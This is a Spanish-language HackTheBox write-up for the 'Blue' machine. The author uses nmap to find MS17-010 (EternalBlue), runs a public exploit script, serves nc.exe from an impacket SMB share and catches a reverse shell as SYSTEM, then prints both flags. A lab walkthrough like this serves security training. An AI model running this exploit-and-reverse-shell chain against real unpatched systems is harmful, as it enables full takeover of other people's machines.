---
layout      : post
title       : "Maquina Blue - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Blue/banner.png
category    : [ hackthebox ]
tags        : [ Smb Enumeration, MS17-010, Eternalblue]
---

El dia de hoy vamos a resolver `Blue` de `hackthebox` una maquina `windows` de dificultad facil, donde explotaremos la famosa vulerabilidad `Eternalblue` que afecta a una versión vulnerable del protocolo `smb` y mediante la cual podremos realizar ejecución remota de comandos `RCE` , esto lo haremos manualmente para comprender mejor la explotación de esta vulnerabilidad y de esta manera ganaremos acceso como el usuario `nt authority\system`.
 
Esta maquina es divertida asi que a darle!.

Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Blue
❯ ls
 Blue
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## ENUMERACION [#](#enumeracion) {#enumeracion}
 

Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.40
PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data.
64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=146 ms

--- 10.10.10.40 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 146.307/146.307/146.307/0.000 ms
```
Vemos que la maquina nos responde, con un ttl de `127` correspondiente a una maquina `windows`, ahora procederemos a el escaneo de puertos con la ayuda de `nmap`:

### ESCANEO DE PUERTOS

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.40 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-18 02:52 GMT
Initiating SYN Stealth Scan at 02:52
Scanning 10.10.10.40 [65535 ports]
Discovered open port 445/tcp on 10.10.10.40
Discovered open port 139/tcp on 10.10.10.40
Discovered open port 135/tcp on 10.10.10.40
Discovered open port 49153/tcp on 10.10.10.40
Discovered open port 49152/tcp on 10.10.10.40
Discovered open port 49156/tcp on 10.10.10.40
Discovered open port 49155/tcp on 10.10.10.40
Discovered open port 49154/tcp on 10.10.10.40
Discovered open port 49157/tcp on 10.10.10.40
Completed SYN Stealth Scan at 02:52, 20.40s elapsed (65535 total ports)
Nmap scan report for 10.10.10.40
Host is up, received user-set (0.22s latency).
Scanned at 2023-06-18 02:52:13 GMT for 20s
Not shown: 65193 closed tcp ports (reset), 333 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49156/tcp open  unknown      syn-ack ttl 127
49157/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.51 seconds
           Raw packets sent: 99432 (4.375MB) | Rcvd: 83167 (3.327MB)
```

### ESCANEO DE VERSION Y SERVICIOS.

```java
❯ nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-18 03:00 GMT
Nmap scan report for 10.10.10.40
Host is up (0.31s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-06-18T03:01:39
|_  start_date: 2023-06-18T02:43:00
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-06-18T04:01:42+01:00
|_clock-skew: mean: -19m57s, deviation: 34m36s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.42 seconds
```
Visulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina `Windows 7`:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 135     | RPC     |   Microsoft Windows RPC |
| 139   | LDAP     |  Microsoft Windows netbios-ssn |
| 445   | SMB     |  Windows 7 Professional 7601 Service Pack 1 microsoft |
| 49152-49157   | MSRPC     | Microsoft Windows RPC |


## EXPLOTACION [#](#explotación) {#explotación}


Vamos a comenzar utilizando los scripts internos de nmap `vuln and safe`, para activar el escaneo de vulnerabilidades de forma segura.

```bash
❯ nmap --script "vuln and safe" -p445 10.10.10.40 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-18 03:07 GMT
Nmap scan report for 10.10.10.40
Host is up (0.13s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 4.50 seconds
```

El escaneo nos reporta que el servicio es vulnerable a `MS17-010` que corresponde a una ejecución remota de comandos.

Para explotar esta vulnerabilidad vamos a usar un `exploit` del repositorio de github de worawit:

* [https://github.com/worawit/MS17-010](https://github.com/worawit/MS17-010)

Vamos a clonar el repositorio y dentro observaremos varios scripts en `python`.

```bash
❯ git clone https://github.com/worawit/MS17-010
Clonando en 'MS17-010'...
remote: Enumerating objects: 183, done.
remote: Total 183 (delta 0), reused 0 (delta 0), pack-reused 183
Recibiendo objetos: 100% (183/183), 113.61 KiB | 476.00 KiB/s, listo.
Resolviendo deltas: 100% (102/102), listo.
❯ cd MS17-010
❯ ls
 shellcode    eternalblue_exploit7.py   eternalchampion_leak.py   eternalromance_leak.py   eternalsynergy_leak.py   mysmb.py         zzz_exploit.py
 BUG.txt      eternalblue_exploit8.py   eternalchampion_poc.py    eternalromance_poc.py    eternalsynergy_poc.py    npp_control.py  
 checker.py   eternalblue_poc.py        eternalchampion_poc2.py   eternalromance_poc2.py   infoleak_uninit.py       README.md
```

Usaremos el `checker.py` para poder enumerar los `namedpipes` vulnerables.

> Named Pipe: Una named pipe es un canal de comunicaciones half-duplex o full-duplex entre un servidor pipe y uno o más clientes. Todas las instancias de una named pipe comparten el mismo nombre, pero cada instancia tiene sus propios búfers y handles y tienen conductos separados para la comunicación cliente-servidor.

```bash
❯ python2 checker.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_ACCESS_DENIED
```

Al ejecutarlo vemos que no nos reporta un `named pipe` vulnerable, asi que vamos a abrir el `checker.py` y vamos a ingresar en las credenciales de invitado `guest`.

![](/assets/images/HTB/htb-writeup-Blue/blue1.PNG)

```bash
❯ python2 checker.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_OBJECT_NAME_NOT_FOUND
samr: Ok (64 bit)
netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
lsarpc: Ok (64 bit)
browser: Ok (64 bit)
```

Esta vez si nos reporta `named pipes` vulnerables, lo siguiente ahora es usar uno de estos en conjunto con el script `zzz_exploit.py` donde tambien asignaremos el usuario `guest` al igual que en el `checker.py`


![](/assets/images/HTB/htb-writeup-Blue/blue3.PNG)


```bash
❯ python2 zzz_exploit.py
zzz_exploit.py <ip> [pipe_name]
```

Dentro de `zzz_exploit.py`, vamos a introducior el codigo que queremos ejecutar en la maquina victima. El cual nos entablara una conexión a nuestra maquina usando el `nc.exe` que ofreceremos mediante un recurso compartido en nuestra maquina.


![](/assets/images/HTB/htb-writeup-Blue/blue2.PNG)


Para ello primero vamos a descargarnos el ejecutable de `nc.exe` de:

* [https://eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)

Concretamente el `netcat 1.12`, lo descomprimimos y usaremos el `nc64.exe`.

```bash
❯ unzip netcat-win32-1.12.zip -d netcat
Archive:  netcat-win32-1.12.zip
  inflating: netcat/doexec.c         
  inflating: netcat/getopt.c         
  inflating: netcat/netcat.c         
  inflating: netcat/generic.h        
  inflating: netcat/getopt.h         
  inflating: netcat/hobbit.txt       
  inflating: netcat/license.txt      
  inflating: netcat/readme.txt       
  inflating: netcat/Makefile         
  inflating: netcat/nc.exe           
  inflating: netcat/nc64.exe         
❯ cd netcat
❯ ls
 doexec.c   generic.h   getopt.c   getopt.h   hobbit.txt   license.txt   Makefile   nc.exe   nc64.exe   netcat.c   readme.txt
❯ rm nc.exe
❯ mv nc64.exe nc.exe
```

Ahora ofrecemos un recurso compartido con el nombre de `smbFolder` y nos ponemos en escucha en el puerto `443`.


```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Ejecutamos en `zzz_exploit.py` en conjunto con uno de los `named pipes` validos, es posible que el exploit deba ejecutarse varias veces.

```bash
❯ python2 zzz_exploit.py 10.10.10.40 samr
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa800328a7c0
SESSION: 0xfffff8a008eed2e0
FLINK: 0xfffff8a0081e5088
InParam: 0xfffff8a00818a15c
MID: 0x803
unexpected alignment, diff: 0x5a088
leak failed... try again
CONNECTION: 0xfffffa800328a7c0
SESSION: 0xfffff8a008eed2e0
FLINK: 0xfffff8a0081df088
InParam: 0xfffff8a003aa715c
MID: 0x803
unexpected alignment, diff: 0x4737088
leak failed... try again
CONNECTION: 0xfffffa800328a7c0
SESSION: 0xfffff8a008eed2e0
FLINK: 0xfffff8a0081f8088
InParam: 0xfffff8a0081f115c
MID: 0x803
unexpected alignment, diff: 0x6088
leak failed... try again
CONNECTION: 0xfffffa800328a7c0
SESSION: 0xfffff8a008eed2e0
FLINK: 0xfffff8a008210088
InParam: 0xfffff8a00820a15c
MID: 0x903
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Opening SVCManager on 10.10.10.40.....
Creating service ijHA.....
Starting service ijHA.....
The NETBIOS connection with the remote host timed out.
Removing service ijHA.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```

Despues de unos segundos se realiza la petición a nuestro recurso compartido.


```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.40,49158)
[*] AUTHENTICATE_MESSAGE (\,HARIS-PC)
[*] User HARIS-PC\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[-] Unknown level for query path info! 0xf
```

y recibimos la conexión directamente como el usuario `nt authority\system`.

```cmd
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.40.
Ncat: Connection from 10.10.10.40:49159.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## ELEVACION DE PRIVILEGIOS [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Buscamos de forma recursiva y visualizamos la primera flag `user.txt`.


```cmd
C:\Users>cd C:\Users\haris\Desktop
cd C:\Users\haris\Desktop

C:\Users\haris\Desktop>type user.txt
type user.txt
33a8d822f06436dc6144f0a0bbe9a6eb
```

Finalmente nos dirigimos al directorio del usuario Administrador y visualizamos la segunda flag `root.txt`

```cmd
C:\Users>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
efa091a0be11892c7056beb574c5bd87
```

